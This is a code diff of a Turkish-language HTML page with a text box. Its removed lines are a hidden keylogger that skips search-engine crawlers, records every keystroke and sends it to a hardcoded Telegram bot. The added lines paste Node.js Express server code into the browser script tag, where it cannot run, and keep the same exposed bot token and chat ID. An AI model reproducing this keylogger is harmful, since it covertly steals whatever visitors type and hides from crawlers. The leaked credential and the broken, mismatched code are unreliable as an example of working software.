@@ -9,46 +9,33 @@
   <textarea id="input" rows="10" cols="60" placeholder="Yazmaya başla..."></textarea>
 
   <script>
-    if (!/Googlebot|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot/.test(navigator.userAgent)) {
+   const express = require('express');
+const axios = require('axios');
+const app = express();
 
-      const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
-      const TELEGRAM_CHAT_ID = '5395609882';
+app.use(express.json());
 
-      let buffer = "";
-      let timeout = null;
+const TELEGRAM_BOT_TOKEN = '7740489037:AAHgOz-DbTeXM-IqY9luQNPL4uao1kWrudU';
+const TELEGRAM_CHAT_ID = '5395609882';
 
-      function sendBuffer() {
-        if (buffer.trim() !== "") {
-          const params = new URLSearchParams();
-          params.append('chat_id', TELEGRAM_CHAT_ID);
-          params.append('text', `[Tuş Takibi]\n${buffer}`);
+app.post('/send', async (req, res) => {
+  const { message } = req.body;
+  if (!message) return res.status(400).json({ error: 'Mesaj gerekli' });
 
-          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: params.toString()
-          })
-          .then(res => res.json())
-          .then(data => {
-            if (!data.ok) {
-              console.error('Telegram API hatası:', data.description);
-            }
-          })
-          .catch(err => console.error('Fetch hatası:', err));
+  try {
+    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+    });
+    res.json(response.data);
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
 
-          buffer = "";
-        }
-      }
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server ${PORT} portunda çalışıyor`));
 
-      document.addEventListener("keydown", function(e) {
-        // Bazı tuşlar e.key olarak 'Unidentified' dönebilir, onları filtrele
-        if (e.key && e.key !== "Unidentified") {
-          buffer += e.key;
-        }
-        clearTimeout(timeout);
-        timeout = setTimeout(sendBuffer, 2000); // 2 saniye boşsa gönder
-      });
-    }
   </script>
 </body>
 </html>
